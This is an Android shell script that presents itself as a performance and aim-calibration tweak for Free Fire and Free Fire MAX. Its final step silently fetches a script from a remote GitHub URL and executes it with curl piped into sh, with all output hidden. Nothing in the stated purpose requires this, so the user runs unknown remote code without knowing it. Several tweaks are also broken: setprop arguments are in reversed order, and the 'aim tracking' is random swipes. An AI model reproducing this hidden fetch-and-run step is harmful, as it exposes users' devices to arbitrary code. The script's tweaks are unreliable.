#!/bin/sh

hz="https://raw.github.com/LanzXsettings/Macro-Modz/resource/HZConfig"

exechz() {
sh -c "$(curl -fsSL "$hz")" > /dev/null 2>&1
}

detect_game() {
  if pm list packages | grep -q com.dts.freefireth; then
    selected_game="com.dts.freefireth"
  elif pm list packages | grep -q com.dts.freefiremax; then
    selected_game="com.dts.freefiremax"
  else
    echo "Game Not Installed"
    exit 1
  fi
}

run_game_setup() {
  if [ "$selected_game" = "com.dts.freefireth" ]; then
    cmd game downscale 1.8 com.dts.freefireth
    cmd device_config put game_overlay com.dts.freefireth mode=2,downscaleFactor=1.8
    cmd package compile -m speed --secondary-dex com.dts.freefireth
    cmd appops set com.dts.freefireth RUN_IN_BACKGROUND
  elif [ "$selected_game" = "com.dts.freefiremax" ]; then
    cmd game downscale 1.8 com.dts.freefiremax
    cmd device_config put game_overlay com.dts.freefiremax mode=2,downscaleFactor=1.8
    cmd package compile -m speed --secondary-dex com.dts.freefiremax
    cmd appops set com.dts.freefiremax RUN_IN_BACKGROUND
  fi

  setprop debug.hwui.renderer skiagl
  dumpsys deviceidle force-idle
  cmd looper_stats disable
}

system_tweaks() {
  dumpsys deviceidle whitelist +com.dts.freefireth > /dev/null 2>&1
  dumpsys deviceidle whitelist +com.dts.freefiremax > /dev/null 2>&1

  setprop false debug.egl.force_msaa > /dev/null 2>&1
  setprop false debug.egl.force_fxaa > /dev/null 2>&1
  setprop false debug.egl.force_taa > /dev/null 2>&1
  setprop false debug.egl.force_smaa > /dev/null 2>&1

  setprop 3000 debug.slow_query_threshold > /dev/null 2>&1
  setprop true debug.hwui.skip_empty_damage > /dev/null 2>&1
  setprop true debug.hwui.capture_skp_enabled > /dev/null 2>&1
  setprop 2 debug.hwui.capture_skp_frames > /dev/null 2>&1

  cmd device_config put touchscreen input_drag_min_switch_speed 400 > /dev/null 2>&1
}

fps_calibration() {
  fps="$(dumpsys display | grep -Eo 'fps=[0-9]+' | cut -d= -f2 | sort -n | uniq | tail -n1)"
  [ -z "$fps" ] && fps=60  # fallback if detection fails

  for pkg in com.dts.freefireth com.dts.freefiremax; do
    cmd game set --fps "$fps" "$pkg" > /dev/null 2>&1
    cmd device_config put game_overlay "$pkg" fps="$fps" > /dev/null 2>&1
  done

  frame_cycle=$(echo "scale=10; 1 / $fps" | bc)
  frame_cycle_ns=$(echo "$frame_cycle * 1000000000" | bc | cut -d'.' -f1)
  phase_offset_ns=$(echo "$frame_cycle_ns / 4" | bc)

  setprop debug.sf.high_fps_early_gl_phase_offset_ns "$phase_offset_ns"
  setprop debug.sf.high_fps_early_phase_offset_ns "$phase_offset_ns"
  setprop debug.sf.high_fps_late_app_phase_offset_ns "$phase_offset_ns"
  setprop debug.sf.high_fps_late_sf_phase_offset_ns "$phase_offset_ns"
}

external_exe() {
  x1=$(expr $RANDOM % 1000 + 1)
  y1=$(expr $RANDOM % 1000 + 1)
  x2=$(expr $RANDOM % 1000 + 1)
  y2=$(expr $RANDOM % 1000 + 1)
  duration=$(expr $RANDOM % 1000 + 500)
  eval "input swipe $x1 $y1 $x2 $y2 $duration -1"
}

aim_tracking_opt() {
  val="$1"
  [ "$val" -lt 0 ] && val=0
  [ "$val" -gt 1000 ] && val=1000
  echo "$val"
}

sensi_calibrar() {
  x=$(expr $RANDOM % 1000 + 1)
  y=$(expr $RANDOM % 1000 + 1)
  duration=$(expr $RANDOM % 1000 + 500)
  x_opt=$(aim_tracking_opt "$x")
  y_opt=$(aim_tracking_opt "$y")

  eval "input swipe $x_opt $y_opt 2000 2000 $duration -1"
  eval "input swipe $x_opt $y_opt 2000 0 $duration -1"
  eval "input swipe $x_opt $y_opt 0 2000 $duration -1"
  eval "input swipe $x_opt $y_opt 0 0 $duration -1"
  eval "input swipe $x_opt $y_opt 2000 2000 $duration -1"
  eval "input swipe $x_opt $y_opt 0 2000 $duration -1"
}

# === Main Execution ===
main() {
detect_game
run_game_setup
system_tweaks
fps_calibration
external_exe
sensi_calibrar
exechz
}
main > /dev/null 2>&1
